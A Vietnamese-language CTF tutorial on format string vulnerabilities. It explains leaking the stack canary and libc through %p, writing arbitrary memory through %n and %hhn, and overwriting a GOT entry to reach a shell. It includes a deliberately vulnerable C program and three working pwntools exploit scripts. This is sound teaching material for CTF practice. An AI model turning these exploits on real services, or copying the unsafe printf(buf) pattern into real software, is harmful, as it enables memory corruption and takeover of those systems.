Format String

Khi chương trình gọi printf(buf) với buf là input của bạn (không có "%s"): bạn kiểm soát chuỗi định dạng. %p đọc stack (leak canary/libc/PIE), %n ghi số byte đã in vào một địa chỉ → ghi tùy ý. Bài này đi số thật: dò offset, leak, rồi ghi GOT bằng fmtstr_payload.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Lỗi: printf(buf) thay vì printf("%s", buf). printf đọc các specifier trong buf và lấy "đối số" từ thanh ghi + stack — nhưng không có đối số thật → nó đọc bừa dữ liệu đang có.

Đọc (leak): %p in một "đối số" (8 byte). %N$p in đối số thứ N. Dò N tới khi thấy chuỗi của mình → biết offset tới buffer.

Ghi: %n ghi số byte đã in vào địa chỉ (đối số). Kết hợp độ rộng %100c + %hhn → ghi từng byte → ghi tùy ý. pwntools fmtstr_payload dựng hộ.

Nếu chỉ nhớ một điều: %p để leak & dò offset, %n để ghi — fmtstr_payload(offset, {addr: value}) làm phần ghi.

⚡ COMBAT CARD — dán chạy khi đang thi
🔎 Dò offset buffer 
p.sendline(b"ABCD%p.%p.%p.%p.%p.%p.%p.%p")
# tìm vị trí in ra 0x44434241 ("ABCD") → đó là offset. no-PIE hay gặp 6.
# hoặc nhanh:  %6$p  %7$p  ... tới khi ra chuỗi của mình
💧 Leak 
%11$p  # thường là stack canary (byte cuối 00)
%21$p  # một địa chỉ libc (__libc_start_main+...) → tính base
# PIE: %p nào ra địa chỉ 0x55.... → base elf
🎯 Ghi (pwntools) 
payload = fmtstr_payload(6, {exe.got.printf: exe.sym.win})
p.sendline(payload)   # offset=6; GOT printf → win
🧮 Specifier chính 
%p  đọc 8 byte (con trỏ)      %s  đọc chuỗi tại con trỏ (deref!)
%n  ghi 4 byte = #đã in       %hn ghi 2 byte   %hhn ghi 1 byte
%N$p đọc đối số thứ N         %Nc in N ký tự (tăng bộ đếm cho %n)
⚠️ Bẫy

Full RELRO → GOT read-only, ghi GOT crash → nhắm exit handler/ret-addr/__malloc_hook. %s con trỏ xấu → crash. Ghi %n lớn tốn in rất nhiều → dùng %hhn từng byte. Chỉ 1 lần printf? dùng one-shot fmtstr.

01 / NỀN TẢNG BẮT BUỘC

printf đọc đối số ở đâu

printf(fmt, ...) trên x86-64 SysV: fmt ở rdi; các đối số varargs lần lượt ở rsi, rdx, rcx, r8, r9 rồi trên stack. Khi gặp một specifier (%p, %d…), printf lấy "đối số kế" theo thứ tự đó. Với printf(buf) — chỉ có 1 đối số thật (buf=rdi) — mọi %p sau sẽ đọc bừa rsi, rdx, ... rồi stack.

Định nghĩa nhanh

format specifier

%p %d %s %n %c... — lệnh định dạng.

offset

Vị trí %N$ mà printf đọc trúng buffer của bạn.

%n

Ghi số byte ĐÃ IN vào địa chỉ (đối số).

direct param access

%N$ — chọn thẳng đối số thứ N.

02 / VÌ SAO CÓ KỸ THUẬT

printf tin tưởng chuỗi định dạng

printf coi tham số đầu là "chương trình nhỏ" mô tả phải in gì & lấy đối số ở đâu. Khi attacker kiểm soát chuỗi đó, họ điều khiển cả việc đọc (specifier không có đối số thật → đọc bừa bộ nhớ = leak) lẫn ghi (%n ghi ngược vào bộ nhớ). Một lỗi 2 ký tự (printf(buf) thiếu "%s") biến thành đọc-ghi tùy ý — một trong các nguyên thủy mạnh nhất, thường đủ để chiếm luồng ngay cả khi có canary/PIE (vì leak được cả hai).

03 / ĐỌC %p · MỤC LÕI

Leak & dò offset (số thật)

Gửi chuỗi đánh dấu + nhiều %p, xem vị trí nào in ra chính chuỗi đánh dấu:

# gửi: "ABCDEFGH" + ".%p"*10
# output (binary no-PIE, canary on):
ABCDEFGH.0x7fffffffe0a0.0x7f....5190.0x1.0x7f....9887.(nil)
        .0x4847464544434241.0x7fffffffe200. ...
#        └ "ABCDEFGH" = 0x4847464544434241 → đây là vị trí thứ 6 → OFFSET=6

Các leak hay dùng (binary mẫu)

PayloadIn ra (ví dụ)Ý nghĩa
%6$p0x4847464544434241Chính buffer → xác nhận offset=6
%11$p0x6a3b...00 (cuối 00)Stack canary (8 byte, byte thấp 0x00)
%21$p0x7ffff7dcf083__libc_start_main+243 → libc base = leak − 0x24083

Vị trí leak = thửCác số 11/21/15 ở trên là ví dụ của binary mẫu — mỗi binary khác. Gửi %1$p…%30$p một lần, đối chiếu giá trị (canary cuối 00, libc 0x7f…, stack 0x7fff…, PIE 0x55…) để biết vị trí nào là gì.
04 / GHI %n

Ghi tùy ý qua số byte đã in

%n ghi số ký tự đã in tới thời điểm đó vào địa chỉ (đối số). Kỹ thuật: (1) đặt địa chỉ đích vào buffer tại một ô stack đã biết offset; (2) in đúng số ký tự = giá trị cần ghi; (3) %n trỏ tới ô đó.

Bảng-byte: payload ghi 1 byte (số thật)

Ghi 0x42 (66) vào 0x404018 (GOT), offset buffer = 6:

%66cin 66 ký tự → bộ đếm = 66 = 0x42
%8$hhnghi 1 byte (0x42) vào đối số thứ 8 = ô chứa địa chỉ
[padding]căn cho địa chỉ rơi đúng ô 8
p64(0x404018)địa chỉ đích đặt tại ô stack thứ 8
# thủ công (khó căn) — thực chiến dùng fmtstr_payload:
payload = b"%66c%8$hhn".ljust(16, b"A") + p64(0x404018)
# %hhn = 1 byte ; %hn = 2 byte ; %n = 4 byte. Ghi địa chỉ 8 byte = 8× %hhn.
Vì sao %hhn từng byteGhi cả 8 byte địa chỉ bằng một %n cần in ~địa_chỉ ký tự (hàng tỉ) — bất khả. Nên ghi từng byte bằng %hhn: in thêm chút ký tự để bộ đếm đạt byte mong muốn, lần lượt 8 byte. fmtstr_payload sắp xếp thứ tự byte tăng dần để tối thiểu số ký tự in.
05 / TỰ TAY THỬ

Trình đọc stack %N$p (dò offset)

Mô phỏng stack khi gọi printf(buf) với buf="ABCDEFGH....". Nhập N → xem %N$p in ra gì; tìm N cho ra "ABCDEFGH".

%1–%5 = rsi/rdx/rcx/r8/r9 (reg). Từ %6 là stack; buffer "ABCDEFGH" nằm ở %6 trong mô phỏng này → offset=6.

07 / EXPLOIT ĐẦY ĐỦ

printf lặp → leak → ghi GOT → win

// vuln.c — gcc vuln.c -o vuln -no-pie -fstack-protector  (Partial RELRO, có canary)
void win(){ system("/bin/sh"); }
int main(){ char buf[0x100];
  for(int i=0;i<3;i++){ fgets(buf,0x100,stdin); printf(buf); }   // fmt, 3 lần
}
# BẢN A — dò offset tay, ghi GOT printf → win bằng %hhn.
from pwn import *
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

# vòng 1: xác nhận offset = 6
p.sendline(b"AAAAAAAA.%6$p")
print(p.recvline())            # → ...0x4141414141414141 ⇒ offset 6

# vòng 2: ghi GOT['printf'] = win (no-PIE → địa chỉ cố định)
win  = exe.sym.win             # vd 0x401196
got  = exe.got.printf          # vd 0x404018
# ghi 2 byte thấp của win (thường đủ vì cùng 0x40xxxx) bằng %hn:
val  = win & 0xffff            # 0x1196 = 4502
payload = f"%{val}c%8$hn".encode().ljust(16, b"A") + p64(got)
p.sendline(payload)            # offset 6 là địa chỉ-liệt; ô chứa got là %8 (6+2 padding)

# vòng 3: gọi printf lần nữa → nhảy win → shell
p.sendline(b"id")
p.interactive()
Thành thậtCăn ô (%8$ vs %6$) tùy cách payload nằm trên stack: địa chỉ phải rơi đúng ô mà printf đọc. Thực chiến dùng fmtstr_payload (bản B) để khỏi căn tay. Số win=0x401196, got=0x404018 là ví dụ no-PIE — của bạn khác.
# BẢN B — pwntools fmtstr_payload lo hết căn byte.
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False)
p = process(exe.path)

OFFSET = 6
# ghi đầy đủ GOT printf = win (fmtstr_payload tự chia %hhn từng byte):
payload = fmtstr_payload(OFFSET, {exe.got.printf: exe.sym.win})
p.sendline(payload)            # vòng này in rất nhiều ký tự — bình thường
p.sendline(b"id")              # printf kế → win()
p.interactive()
Full RELRO?Nếu GOT read-only: đổi đích sang exe.sym.__stack_chk_fail không được (cũng GOT), dùng return address trên stack (leak stack trước), hoặc __exit_funcs / libc.sym.__malloc_hook. fmtstr_payload(OFFSET, {ret_addr: win}).
# BẢN C — pwntools FmtStr tự dò offset + ghi; hoặc pwnld fmtstr_pos.
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False)

def send(payload):
    p = process(exe.path); p.sendline(payload)
    return p.recvall()
fmt = FmtStr(execute_fmt=send)   # tự dò offset
log.info(f"offset = {fmt.offset}")
fmt.write(exe.got.printf, exe.sym.win)
fmt.execute_writes()
# pwnld: pos = fmtstr_pos(p)  rồi  fmtstr_payload(pos, {...})
pwntoolsFmtStr(execute_fmt) tự dò offset & dồn nhiều lần ghi. Dùng khi có thể gọi fmt nhiều lần. pwnld fmtstr_pos trả offset tự động.

09 / GỠ LỖI

Khi fmtstr không ăn

Offset sai

%N$p không ra chuỗi của mình. Dò lại 1→30. Chú ý prefix làm lệch.

Ghi GOT crash (Full RELRO)

Đổi đích ret-addr/exit handler/hook.

%s crash

Con trỏ đối số không hợp lệ → deref lỗi. Tránh %s khi chưa chắc.

%n bị cấm (FORTIFY)

_FORTIFY_SOURCE chặn %n trong writable fmt. Chỉ leak được, không ghi %n.

In quá nhiều treo

%Nc với N khổng lồ. Ghi từng byte %hhn, thứ tự tăng dần.

Địa chỉ chứa null

Null byte cắt chuỗi (nếu đọc bằng scanf %s). Đặt địa chỉ ở CUỐI payload.
